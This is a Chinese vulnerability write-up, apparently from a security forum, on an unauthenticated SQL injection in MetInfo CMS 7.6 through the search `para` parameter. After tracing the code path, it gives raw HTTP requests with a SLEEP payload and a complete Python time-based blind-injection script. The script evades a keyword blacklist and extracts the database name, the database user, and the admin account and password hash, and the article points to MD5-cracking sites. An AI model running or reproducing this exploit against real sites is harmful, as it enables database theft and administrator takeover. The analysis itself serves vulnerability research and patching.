---
title: 【先知】MetInfo CMS v7.6 前台 search 参数 SQL 注入漏洞分析与利用
source: https://xz.aliyun.com/news/92782
source_host: xz.aliyun.com
clip_date: 2026-09-11T15:09:58+08:00
trace_id: 23f0d4b7-f2b5-4b8b-be16-bf1177692469
content_hash: c56c3b6d8c09cd99dc67e8cebe92bac0e2fdaecd4d0e3b7847f5cebad9472fdd
status: synced
tags:
  - 先知
  - 漏洞分析
  - 代码审计
series: null
feed_source: 先知安全技术社区
ai_summary: MetInfo 7.6 前台 `search=search&para=...` 参数经 base64 解码后未再过滤，直接拼进 `parameter_label::get_search_list_sql` 的 SQL，可在未授权下造成时间盲注注入。
ai_summary_style: key-points
images_status:
  total: 23
  succeeded: 23
  failed_urls: []
notion_page_id: 3d875244-d011-815d-91d2-ebe51cabc08f
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> MetInfo 7.6 前台 `search=search&para=...` 参数经 base64 解码后未再过滤，直接拼进 `parameter_label::get_search_list_sql` 的 SQL，可在未授权下造成时间盲注注入。
> 
> - **注入点：** `app/system/parameter/include/class/parameter_label.class.php#get_search_list_sql` 中 `$info`（含 `id` 值）被大量 SQL 拼接后直接查询。
> - **触发链：** `search_info()` 要求 `$_M['form']['search']` 存在；`para` 经 `base64_decode` + `json_decode` 后逐项转成 `['id'=>$key,'info'=>$val]`，最终以 `$cond['para']['info']` 进入 `get_list_by_class_sql` 的 `OR id IN ({$para})`。
> - **绕过成因：** 全局 `load_form` 仅用 `daddslashes` 转义 GET/POST/COOKIE 并存入 `$_M['form']`，而 `para` 在后续才做 base64 解码，转义完全失效，恶意 payload 应放在 JSON 的 key 上。
> - **调用入口：** 模板 `<tag action='模块.方法'>` 经 `view_compile`、`call_user_func` 动态分发到 `模块_tag.class.php` 的 `_xxx` 方法，再走 `base_label.class.php#get_list_page`；`job_database` 重写了父类方法导致无 para 分支，改用 `download`、`news` 等未重写路由即可。
> - **利用实例：** `GET /download/index.php?search=search&para=<base64(json)>`，payload `{"1' OR SLEEP(0.1)-- -":"x"}` 生效；文中脚本用 `IF(条件,SLEEP(0.5),0)` 二分法盲注 `DATABASE()`、`USER()`、`met_admin_table` 的账号与密码散列，并对 base64 串做关键词黑名单规避。

## 7.6版本前台SQL注入

找到sink处， `app/system/parameter/include/class/parameter_label.class.php#get_search_list_sql` ，发现存在大量的SQL语句拼接，然后直接在后面查询了。我们再看一下进入sink点的条件： `$info` 为字典（ `$val` 为恶意payload）。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fc6939106f5fdb49.png)

全局搜 `get_search_list_sql` 。 `app/system/base/include/class/base_database.class.php#get_list_by_class_sql` 。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1b47cdcc483142c7.png)

```php
//系统参数筛选  
if ($cond['para']['status'] && $cond['para']['info']) {  
    $para = load::sys_class('label', 'new')->get('parameter')->get_search_list_sql($this->module, $cond['para']['precision'], $cond['para']['info']);  
    if ($para != 'all') {  
        $search .= " OR id IN ({$para}) "; //如果以后需要加强字段搜索，就在这里添加代码。  
    }  
}
```

第三个参数是我们需要构造恶意payload的地方，然后我看看进入这段代码的条件：

-   `if (isset($cond['type']) && ($cond['type'] == 'array' || $cond['type'] == 'tag'))`
-   `if (isset($_M['form']['search']))`

上述if语句都是需要成功通过的。这个 `$cond` 是 `get_list_by_class_sql` 方法的第二个参数。接着我们关注 `$_M['form']` ，这是什么东西，看上去像是表单提交的东西。

我们从整个网站的index入口点开始找找看：

```php
<?php  
# MetInfo Enterprise Content Management System  
# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.  
define('M_NAME', 'index');  
define('M_MODULE', 'web');  
define('M_CLASS', 'index');  
define('M_ACTION', 'doindex');  
require_once './app/system/entrance.php';  
  
# This program is an open source system, commercial use, please consciously to purchase commercial license.  
# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.  
?>
```

看这个路由，我们往 `app/system/web/index.class.php` 找。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1f1a415285fa08b9.png)

后面会直接使用 `$_M` ，那么说明它是已经被构造好了的，我们往父类的构造函数找。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d66b30c02d8110fb.png)

继续跟进。找到 `common.class.php` ，里面存在一堆的初始化与加载函数，我们随便跟进几个看看，下面的 `load_form` 其实就是跟 `$_M['form']` 相关的。理解一下这个 `$_M` 其实就相当于是MetInfo自己定义的一个全局数组，整个程序运行时的所有状态都存在里面。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0f642a1df3a7ff1d.png)

我们先随便进一个看看，发现其中确实是对 `$_M` 的一些赋值。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8628ebdf3ad93614.png)

接下来我们看 `load_form` 。这个方法其实就是对 `$_COOKIE` 、 `$_POST` 、 `$_GET` 进行一些处理后存入 `$_M` 。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ee0da1767e8a4e8b.png)

## 输入转义与防护机制

我们看看是怎么进行处理的。对GET、POST的值进行转义处理（daddslashes），该方法其中也存在sql注入的一些防护。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/250fed7618f64c4a.png)  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b7254b8b8c2228d9.png)

好了，我们回到 `app/system/base/include/class/base_database.class.php#get_list_by_class_sql` 。继续找谁调用了这个方法。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b3986b9abdda5ac5.png)

`$cond` 是第四个参数，继续找调用。找到 `app/system/base/include/class/base_label.class.php#get_list_page` 。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/49b489ae806d1693.png)

我们需要关注的是 `$cond` 的取值。它来自于 `$search['type']` ，所以我们先跟进 `search` 方法看看。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/94339cbd1d3c1c08.png)

这里分别看一下两个方法，都在 `search_label.class.php` 中。只有 `search_info` 存在对 `$_M['form']['para']` 的赋值，而我们先前的传参是 `$cond['para']` 。所以我们关注 `search_info` 方法：

```php
public function search_info()  
{  
    global $_M;  
  
    if ($_M['form']['search']) {  
        if ($_M['form']['title'] || $_M['form']['content'] || $_M['form']['searchword']) {  
            if ($_M['form']['content']) {  
                $word = $_M['form']['content'];  
            } else {  
                $word = $_M['form']['searchword'];  
            }  
            $type = $this->get_search_type(0, $word);  
            return $type;  
        } elseif ($_M['form']['para']) {  
            //$paratmp = json_decode(load::sys_class('auth', 'new')->decode($_M['form']['para']), true);  
            $paratmp = json_decode(base64_decode($_M['form']['para']), true);  
            foreach ($paratmp as $key => $val) {  
                $para[] = array(  
                    'id' => $key,  
                    'info' => $val,  
                );  
            }  
            $type = array(  
                'type' => 'array',  
                'title' => array(  
                    'status' => 0,//title搜索  
                ),  
                'content' => array(  
                    'status' => 0,//内容搜索  
                ),  
                'tag' => array(  
                    'status' => 0,//tag搜索  
                ),  
                'specv' => array(  
                    'status' => 0,//规格搜索  
                ),  
                'para' => array(  
                    'status' => 1,//系统属性搜索  
                    'precision' => 0,  
                    'info' => $para,  
                ),  
            );  
            return $type;  
        } elseif ($_M['form']['specv'] || $_M['form']['price_low'] || $_M['form']['price_top']) {  
            $shop_search = load::app_class('shop/include/class/shop_search', 'new');  
            if (method_exists($shop_search,'getSearchType')) {  
                $specv = $shop_search->getSearchType($_M['form']['specv']);    //new  
            }else{  
                $specv = json_decode(load::sys_class('auth', 'new')->decode($_M['form']['specv']), true); //old  
            }  
  
             $type = array(  
                'type' => 'array',  
                'title' => array(  
                    'status' => 0,//开启搜索  
                ),  
                'content' => array(  
                    'status' => 0,//开启搜索  
                ),  
                'tag' => array(  
                    'status' => 0,//开启搜索  
                ),  
                'para' => array(  
                    'status' => 0,//开启搜索  
                ),  
                'specv' => array(  
                    'status' => 1,//开启搜索  
                    'precision' => 0,  
                    'info' => $specv  
                )  
            );  
            return $type;  
        }  
    }  
}
```

## para构造与解码绕过

要想成功赋值para，我们传参 `search` 和 `para` 即可。进入的是如下 `else if` 部分。这里我们发现para传参是要经过base64解码的，因此之前的sql注入防御全部失效！成功近在咫尺。这里注意一下：我们的恶意payload应该在 `'id' => $key` ，也就是key。我们从最开始追踪一下就知道： `$cond ->['para'] -> ['info'] -> 的值 -> id` 。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a8803f0dc52618e7.png)

然后我们回到 `get_list_page` 方法，赋值给 `$search` 后就一目了然了。继续寻找调用。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7224d9650300b9ef.png)

发现存在大量的调用，看了一下，是因为 `base_label.class.php` 是父类，下属有一堆子类不存在 `get_list_page` 方法，所以调用的是父类的方法，因此可以成功调用。这里我们随便找一个： `app/system/job/include/class/job_tag.class.php#_list` 。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9757882ba572a20d.png)

这里我们全局搜 `_list` ，找不到任何直接调用。因为它是被动态分发（反射）调用的。我们全局搜一下 `call_user_func`  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/da32969289f65c6f.png)

这里调用了本对象的 `_.$tag` 方法， `job_tag` 的父类其实就是 `tag` 类，因此它可以调用到父类的 `parseTag` 方法来解析标签。  
这里的 `_` 是直接拼接的，所以我们不可能全局搜到。然后我们再搜一下parseTag看看。会跟进到 `view_compile` 类，这是模板编译器。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bc8318e4fb2ad45a.png)

## 模板标签的动态分发

既然是标签的解析，这里我们直接全局搜html标签吧，应该是标签中写出了调用方法。找到个完美符合的， `action` 为 `job.list` ，也就是调用 `job_tag` 的 `_list` 方法， `_list` 一眼就是内部的调用，所以此处非常合理。总结一下：看到模板 `<tag action='模块.方法'>` ，就去找 `app/system/模块/include/class/模块_tag.class.php` 的 `_` 方法。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/dc23deb59d0da3c3.png)

接下来我们需要知道哪里对 `job.php` 进行了渲染，或者哪里调用了 `job.php` 。我们可以直接在job模块的目录下找，也可以全局搜 `view` 函数。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9dc807fd9b47d747.png)

然后我们找 `job#dojob` 方法被谁调用。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c38e4e5f645178b5.png)

ok，此处我们遵从路由规则即可。 `GET /job/index.php?search=search&para=<base64(json)>` 。

## 避开子类方法重写

但是此处我们失败了，回头看代码是因为 `job_database.class.php` 重写了父类的 `get_list_by_class_sql` ，里面的para分支不见了！！！所以我们回头重新找一个没有重写的即可。全局搜 `get_list_page` 。找了一个 `download` 的。  
![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d5fd10fd08441209.png)

尝试时间盲注 `{"1' OR SLEEP(0.1)-- -":"x"}` ：

```plain
GET /download/index.php?search=search&para=eyIxJyBPUiBTTEVFUCgwLjEpLS0gLSI6IngifQ== HTTP/1.1
Host: 127.0.0.1:8000

GET /news/index.php?search=search&para=eyIxJyBPUiBTTEVFUCgwLjEpLS0gLSI6IngifQ== HTTP/1.1
Host: 127.0.0.1:8000
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8bedc92325891dc0.png)

成功了。实际上不止download路由存在漏洞。

## 时间盲注利用脚本

给出exp：

```python
"""
MetInfo 7.6 前台搜索 para 参数 未授权 SQL 注入 — 时间盲注数据提取脚本
注入点: parameter_label::get_search_list_sql()  info 位置 (met_plist, 2行)
oracle : SLEEP(1) 执行 → ~2s ; 不执行 → ~0.06s
用法   : python metinfo_blind_extract.py
"""
import urllib.request
import base64
import json
import time
import sys

BASE = "http://127.0.0.1:8000/download/index.php?lang=cn&search=search&para={}"

# sqlinsert() 对 base64 串的关键词黑名单（大小写不敏感）
BLOCKED = ["select", "insert", "update", "delete", "union", "into",
           "load_file", "outfile", "sleep", "*", "~"]

SLEEP_SEC = 0.5   # 单次 SLEEP 秒数（met_plist 2 行 → TRUE≈2×0.5=1s，FALSE≈0.06s）
THRESHOLD = 0.5   # 判定阈值，calibrate() 会自动校准


def enc(info, key="200"):
    """构造 para=base64(json)，若 base64 命中黑名单则末尾补空格重试（补位在 -- 注释内，不影响 SQL）"""
    while True:
        data = json.dumps({key: info}, ensure_ascii=False, separators=(",", ":"))
        b = base64.b64encode(data.encode("utf-8")).decode("utf-8")
        low = b.lower()
        if not any(w in low for w in BLOCKED):
            return b
        info += " "


def send(info):
    """发送请求，返回耗时"""
    url = BASE.format(enc(info))
    t0 = time.time()
    try:
        urllib.request.urlopen(url, timeout=15)
    except Exception:
        pass
    return time.time() - t0


def oracle(condition):
    """条件为真 → SLEEP → 超过阈值；返回布尔"""
    payload = "x' OR IF({},SLEEP({}),0)-- -".format(condition, SLEEP_SEC)
    return send(payload) > THRESHOLD


def calibrate():
    """校准阈值：测一次确定真假，取中间值"""
    t_false = send("x' OR IF(1=2,SLEEP({}),0)-- -".format(SLEEP_SEC))
    t_true = send("x' OR IF(1=1,SLEEP({}),0)-- -".format(SLEEP_SEC))
    global THRESHOLD
    THRESHOLD = (t_false + t_true) / 2
    print("[*] 校准: FALSE=%.2fs TRUE=%.2fs 阈值=%.2fs" % (t_false, t_true, THRESHOLD))


def extract(query, length, desc=""):
    """逐字符二分盲注提取, query 为不带 SELECT 的查询表达式或完整 SELECT"""
    result = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = "ASCII(SUBSTR(({}),{},1))>{}".format(query, pos, mid)
            if oracle(cond):
                lo = mid + 1
            else:
                hi = mid
        result += chr(lo)
        sys.stdout.write("\r[%s] %s %d/%d -> %s" % (desc, query[:40], pos, length, result))
        sys.stdout.flush()
    print()
    return result


if __name__ == "__main__":
    print("[*] MetInfo 7.6 para 参数时间盲注提取")
    calibrate()

    db = extract("SELECT DATABASE()", 20, "DB")
    user = extract("SELECT USER()", 20, "user")
    print("\n[+] database =", db)
    print("[+] user     =", user)

    admin_id = extract("SELECT admin_id FROM met_admin_table LIMIT 1", 20, "admin_id")
    admin_pass = extract("SELECT admin_pass FROM met_admin_table LIMIT 1", 32, "admin_pass")

    print("\n" + "=" * 50)
    print("[+] 提取结果:")
    print("    admin_id  = %s" % admin_id)
    print("    admin_pass= %s" % admin_pass)
    print("    (admin_pass 为 MD5，可用 cmd5/somd5 反查明文)")
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9672b3ec570d8dfc.png)
